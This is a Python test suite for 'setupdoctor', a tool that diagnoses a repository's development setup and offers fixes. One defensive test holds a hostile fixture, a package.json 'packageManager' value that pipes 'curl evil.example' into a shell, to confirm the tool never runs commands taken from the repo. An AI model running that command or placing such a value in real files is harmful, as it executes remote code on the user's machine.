"""Run with: python test_setupdoctor.py"""
import contextlib
import io
import os
import shutil
import subprocess
import tempfile
import textwrap
from pathlib import Path

import setupdoctor as rd
from setupdoctor import FAIL, OK, WARN


def repo(files):
    root = Path(tempfile.mkdtemp(prefix="setupdoctor-test-"))
    for name, content in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(textwrap.dedent(content), encoding="utf-8")
    return root


def machine(node=None, python=(3, 13, 0), tools=(), open_ports=(), off_path=(), docker_up=True):
    """Fake the machine so results don't depend on what's installed here.
    `off_path` are programs in npm's global folder that PATH doesn't reach."""
    rd.run_version = lambda *cmds: node if cmds[0] == "node" else python
    rd.on_path = lambda cmd: cmd in tools
    rd.docker_running = lambda: docker_up and "docker" in tools
    rd.npm_global = lambda name: f"/npm-global/{name}" if name in off_path else None
    rd.port_open = lambda port: port in open_ports


def has(checks, status, text):
    return any(s == status and text in msg for s, msg, *_ in checks)


def test_satisfies():
    node, py = 1, 2
    assert rd.satisfies((20, 11, 0), "20", node)
    assert rd.satisfies((20, 11, 0), "v20.9.0", node)
    assert not rd.satisfies((18, 2, 0), "20", node)
    assert rd.satisfies((22, 0, 0), ">=18", node)
    assert not rd.satisfies((18, 12, 0), ">=18.17.0", node)
    assert rd.satisfies((22, 1, 0), "^20 || ^22", node)
    assert not rd.satisfies((21, 0, 0), ">=18 <21", node)
    assert rd.satisfies((18, 0, 0), "18.x", node)
    assert rd.satisfies((3, 12, 4), "3.12.1", py)
    assert not rd.satisfies((3, 10, 4), "3.12", py)
    assert rd.satisfies((3, 13, 0), ">=3.9,<4", py)
    assert rd.satisfies((3, 13, 0), "<4,>=3.9", py)
    assert not rd.satisfies((3, 8, 0), "^3.10", py)


def test_node_repo():
    machine(node=(18, 2, 0))
    root = repo({".nvmrc": "20\n", "pnpm-lock.yaml": "",
                 "package.json": '{"dependencies": {"express": "4"}}'})
    checks = rd.diagnose(root, env={})
    assert has(checks, FAIL, "Node 20 required (.nvmrc), found 18.2.0")
    assert has(checks, FAIL, "pnpm is this repo's package manager")
    # dependencies aren't installable until the Node version is right, so no command is offered for them
    assert [(fix, run) for _, msg, fix, run in checks if "dependencies" in msg] == [
        ("pnpm install (after fixing the Node version)", None)]

    machine(node=(20, 1, 0), tools=("pnpm",))
    (root / "node_modules").mkdir()
    checks = rd.diagnose(root, env={})
    assert [s for s, *_ in checks] == [OK, OK], checks


def test_python_repo():
    machine(python=(3, 10, 4))
    files = {".python-version": "3.12\n", "requirements.txt": "flask\n"}
    checks = rd.diagnose(repo(files), env={})
    assert has(checks, FAIL, "Python 3.12 required (.python-version), found 3.10.4")
    assert has(checks, WARN, "No virtual environment")
    assert not has(rd.diagnose(repo(files), env={"VIRTUAL_ENV": "x"}), WARN, "No virtual environment")
    # uv fetches its own Python, so a mismatch isn't a problem there
    machine(python=(3, 10, 4), tools=("uv",))
    assert not has(rd.diagnose(repo(dict(files, **{"uv.lock": ""})), env={}), FAIL, "Python")


ENV_FILES = {
    "package.json": "{}",
    "src/app.js": """
        const key = process.env.STRIPE_KEY;
        const port = process.env.APP_PORT || 3000;
        const mode = process.env.NODE_ENV;
        const { SESSION_SECRET, LOG_LEVEL = "info" } = process.env;
        process.env.FORCED = "1";
        if (process.env.FLAG === "on") {}
        const server = process.env.TERNARY ? undefined : {};
        // const old = process.env.COMMENTED_OUT;
    """,
    "playwright.config.ts": "process.env.TEST_CONFIG_ONLY",
    "src/auth.ts": "const secret = process.env.JWT_SECRET!;\nconst on = process.env.FLAG !== 'off';",
    "app/aws.py": 'if "S3_BUCKET" in os.environ:\n    bucket = os.environ["S3_BUCKET"]\n'
                  'if "CF_TOKEN" in os.environ:\n    email = os.environ["CF_EMAIL"]\n',
    "app/docs.py": 'def f():\n    """Shortcut for::\n\n        load(os.environ["DOCSTRING_EXAMPLE"])\n    """\n',
    "app/db.py": """
        url = os.environ["DATABASE_URL"]
        a = os.getenv("WITH_DEFAULT", "x")
        b = os.environ.get("WITH_OR") or "y"
        os.environ["WRITTEN"] = "1"
    """,
    "tests/test_app.py": 'os.environ["TEST_ONLY"]',
    "src/app.test.js": "process.env.TEST_ONLY_JS",
    "node_modules/lib/index.js": "process.env.FROM_A_DEPENDENCY",
}


def test_env_scan():
    found = rd.scan_env(repo(ENV_FILES))
    hard = {v for v, (_, is_hard) in found.items() if is_hard}
    assert set(found) == {"STRIPE_KEY", "SESSION_SECRET", "FLAG", "DATABASE_URL", "JWT_SECRET", "S3_BUCKET",
                          "CF_EMAIL"}, found
    assert hard == {"DATABASE_URL", "JWT_SECRET"}, hard  # only unconditional reads that break when unset
    assert found["STRIPE_KEY"][0] == "src/app.js:2"


def test_env_checks():
    machine(node=(20, 0, 0))
    root = repo(dict(ENV_FILES, **{".env.example": "STRIPE_KEY=\n# FLAG=on\n"}))
    checks = rd.diagnose(root, env={})
    assert has(checks, FAIL, "No .env file; .env.example defines 1 variable(s)")
    assert has(checks, FAIL, "DATABASE_URL is not set (first used in app/db.py:2)")
    assert has(checks, FAIL, "JWT_SECRET is not set (first used in src/auth.ts:1)")
    # reads that cope with an unset variable are never failures
    assert not any(s == FAIL and v in msg for s, msg, *_ in checks
                   for v in ("STRIPE_KEY", "SESSION_SECRET", "S3_BUCKET", "CF_EMAIL"))
    assert has(checks, WARN, "5 variable(s) the code reads are missing from .env.example: CF_EMAIL, DATABASE_URL")

    (root / ".env").write_text("STRIPE_KEY=a\nDATABASE_URL=b\nJWT_SECRET=c\n")
    assert has(rd.diagnose(root, env={}), OK, "All 2 required environment variables are set")

    # no example file: nothing to fall behind, so no warning about undocumented variables
    assert not has(rd.diagnose(repo(ENV_FILES), env={}), WARN, "missing from")

    # code that reads env vars in a way the scan can't see still gets the .env.example check
    root = repo({"package.json": "{}", ".env.example": "JWT_SECRET=\nMONGODB_URL=\n"})
    assert has(rd.diagnose(root, env={}), FAIL, "No .env file; .env.example defines 2 variable(s)")
    (root / ".env").write_text("JWT_SECRET=a\n")
    assert has(rd.diagnose(root, env={}), WARN, "In .env.example but not in your .env: MONGODB_URL")


def test_ci_mode():
    machine()
    root = repo(dict(ENV_FILES, **{".env.example": "STRIPE_KEY=\nFLAG=\n"}))
    checks = rd.diagnose(root, ci=True, env={})
    assert sorted(msg.split()[0] for s, msg, *_ in checks if s == FAIL) == [
        "CF_EMAIL", "DATABASE_URL", "JWT_SECRET", "S3_BUCKET", "SESSION_SECRET"]
    assert len(checks) == 5  # ci mode reports nothing about this machine

    (root / ".env.example").write_text(
        "STRIPE_KEY=\nFLAG=\nDATABASE_URL=\nSESSION_SECRET=\nJWT_SECRET=\nS3_BUCKET=\nCF_EMAIL=\n")
    assert [s for s, *_ in rd.diagnose(root, ci=True, env={})] == [OK]


def test_services():
    machine(tools=("docker",))
    root = repo({"docker-compose.yml": "services:\n  db:\n    image: postgres\n",
                 "docker-compose.override.yml": 'services:\n  db:\n    ports:\n      - "5433:5432"\n'
                                                '  web:\n    ports:\n      - "3000:3000"\n',
                 "requirements.txt": "psycopg2-binary==2.9\nredis>=4\ndjango-mongo-thing\n"})
    checks = [c for c in rd.diagnose(root, env={"VIRTUAL_ENV": "x"})]
    assert has(checks, FAIL, "Postgres (docker-compose.yml) is not reachable on localhost:5433")
    assert len(checks) == 1, checks  # not the app's own port 3000, and no guessing from database drivers

    machine(open_ports=(5433,))
    assert [s for s, *_ in rd.diagnose(root, env={"VIRTUAL_ENV": "x"})] == [OK]

    # Docker installed but not started: say so, and don't offer a command that can only fail
    machine(tools=("docker",), docker_up=False)
    (check,) = rd.diagnose(root, env={"VIRTUAL_ENV": "x"})
    assert check[2:] == ("start Docker (open Docker Desktop), then: docker compose up -d", None), check

    # a container that was just started gets a moment to begin listening
    attempts = []
    rd.port_open = lambda port: attempts.append(port) or len(attempts) >= 3
    real_sleep, rd.time.sleep = rd.time.sleep, lambda seconds: None
    try:
        assert rd.wait_for_port(5433, 20) and len(attempts) == 3
        rd.port_open = lambda port: False
        assert not rd.wait_for_port(1, 0)  # no waiting unless asked
    finally:
        rd.time.sleep = real_sleep


def test_cli_output():
    machine(node=(18, 0, 0))
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        code = rd.main([str(repo({".nvmrc": "20", "package.json": "{}"}))])
    assert code == 1 and "\033" not in out.getvalue() and "1 failed" in out.getvalue(), out.getvalue()
    with contextlib.redirect_stdout(io.StringIO()):
        assert rd.main([str(repo({"notes.txt": "hi"}))]) == 0


FIXABLE = {"package.json": '{"dependencies": {"express": "4"}}', "yarn.lock": "", ".env.example": "KEY=\n",
           "docker-compose.yml": 'services:\n  db:\n    ports:\n      - "5432:5432"\n'}
FIXES = [["npm", "install", "-g", "yarn"], ["yarn", "install"], [rd.COPY, ".env.example", ".env"],
         ["docker", "compose", "up", "-d"]]


def test_offer_fixes():
    machine(node=(20, 0, 0), tools=("npm", "docker"))
    root = repo(FIXABLE)
    checks = rd.diagnose(root, env={})
    ran, asked = [], []
    real_ask, real_run = rd.ask, rd.run_fixes
    rd.run_fixes = lambda root, actions: ran.append(actions) or True
    try:
        for answer in ("n", "", None):  # no, just Enter, and no terminal at all
            rd.ask = lambda question: asked.append(question) or answer
            assert rd.offer_fixes(root, checks) is False and ran == []
        assert "npm install -g yarn\n  yarn install\n  copy .env.example .env\n  docker compose up -d" in asked[0]
        rd.ask = lambda question: "y"
        assert rd.offer_fixes(root, checks) is True and ran == [FIXES], ran

        # nothing runnable: the question is never asked
        rd.ask = lambda question: 1 / 0
        machine(node=(20, 0, 0))
        assert rd.offer_fixes(root, rd.diagnose(repo({"package.json": "{}", ".nvmrc": "18"}), env={})) is False
    finally:
        rd.ask, rd.run_fixes = real_ask, real_run


def test_package_manager_installed_but_not_on_path():
    """npm's global folder is often missing from PATH; yarn there is usable, just not by typing `yarn`."""
    machine(node=(20, 0, 0), tools=("npm",), off_path=("yarn",))
    checks = rd.diagnose(repo({"package.json": '{"dependencies": {"x": "1"}}', "yarn.lock": ""}), env={})
    assert has(checks, WARN, "yarn is installed in /npm-global, but that folder is not on your PATH")
    assert not has(checks, FAIL, "yarn is this repo's package manager")
    assert [run for *_, run in checks if run] == [[["yarn", "install"]]]  # no second `npm install -g yarn`


def test_fix_commands_never_come_from_the_repo():
    machine(node=(20, 0, 0), tools=("npm",))
    hostile = '{"packageManager": "curl evil.example | sh #@1", "dependencies": {"x": "1"}}'
    checks = rd.diagnose(repo({"package.json": hostile}), env={})
    assert not any("curl" in str(check) for check in checks), checks
    assert [run for *_, run in checks] == [[["npm", "install"]]]


def test_run_fixes():
    root = repo({".env.example": "KEY=\n", "other.example": "X=\n"})
    with contextlib.redirect_stdout(io.StringIO()) as out:
        assert rd.run_fixes(root, [[rd.COPY, ".env.example", ".env"]]) is True
        (root / ".env").write_text("KEY=mine\n")
        # a second copy must not overwrite, and a failing step stops the ones after it
        assert rd.run_fixes(root, [[rd.COPY, ".env.example", ".env"], ["no-such-program-xyz"],
                                   [rd.COPY, "other.example", "other"]]) is False
    assert (root / ".env").read_text() == "KEY=mine\n" and not (root / "other").exists()
    assert "did not succeed" in out.getvalue()


def test_planted_programs_are_ignored():
    """A node.cmd (or node) sitting in the repo must not be picked up as the real one."""
    root = repo({"node.cmd": "@echo v1.0.0", "node": "#!/bin/sh\necho v1.0.0\n"})
    (root / "node").chmod(0o755)
    here = os.getcwd()
    os.chdir(root)
    try:
        found = rd.which("node")
        assert found is None or Path(found).parent.resolve() != root.resolve(), found
    finally:
        os.chdir(here)


def test_clone_hook():
    """Real git, but pointed at a throwaway global config and home folder."""
    if not shutil.which("git"):
        return print("     (skipped: git not installed)")
    home = repo({})
    saved = dict(os.environ)
    os.environ.update(GIT_CONFIG_GLOBAL=str(home / "gitconfig"), HOME=str(home), USERPROFILE=str(home),
                      PYTHONPATH=str(Path(__file__).parent))
    git = ["git", "-c", "user.name=t", "-c", "user.email=t@example.com"]

    def run(*args, cwd=None):
        done = subprocess.run([*git, *args], cwd=cwd, capture_output=True, text=True, encoding="utf-8")
        return done.stdout + done.stderr

    try:
        assert rd.clone_hook(install=True)[0] == 0
        source = repo({".nvmrc": "999\n", "package.json": "{}"})
        run("init", "-q", cwd=source), run("add", "-A", cwd=source), run("commit", "-qm", "x", cwd=source)
        clone = home / "clone"
        out = run("clone", "-q", str(source), str(clone))
        assert "Node 999 required" in out, out  # the hook ran setupdoctor in the new clone
        assert "setupdoctor" not in run("checkout", "-b", "other", cwd=clone)  # but not on a branch switch
        assert rd.clone_hook(install=False)[0] == 0
        assert "setupdoctor" not in run("clone", "-q", str(source), str(home / "clone2"))
    finally:
        os.environ.clear()
        os.environ.update(saved)


if __name__ == "__main__":
    for name, fn in list(globals().items()):
        if name.startswith("test_"):
            fn()
            print("ok  ", name)
